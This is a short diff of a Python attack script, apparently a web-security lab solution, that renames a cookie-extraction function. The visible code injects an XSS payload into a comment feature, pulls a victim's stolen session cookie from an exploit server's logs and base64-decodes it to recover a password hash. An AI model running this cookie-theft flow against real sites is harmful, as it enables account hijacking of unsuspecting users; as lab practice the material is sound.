@@ -52,7 +52,7 @@ def exploit_xss_in_comment_functionality(url, exploit_server_url):
 ##################################################################
 # Function used to extract the cookie from the exploit sever logs
 ##################################################################
-def extract_victim_cookie_from_logs(exploit_server_url):
+def extract_cookie_from_logs(exploit_server_url):
     try:
         res = requests.get(f"{exploit_server_url}/log")
         if res.status_code == 200:
@@ -74,7 +74,7 @@ def extract_victim_cookie_from_logs(exploit_server_url):
 ###############################
 is_exploited = exploit_xss_in_comment_functionality(url, exploit_server_url) # try to inject the XSS payload
 if is_exploited: # if the payload is injected successfully
-    cookie = extract_victim_cookie_from_logs(exploit_server_url) # try to extract the cookie from your server logs
+    cookie = extract_cookie_from_logs(exploit_server_url) # try to extract the cookie from your server logs
     if cookie != None: # if you found the cookie
         print(Fore.WHITE + "3. Decoding the encrypted cookie.. ☑️")
         decrypt = base64.b64decode(cookie).decode() # decode the cookie to get the hash
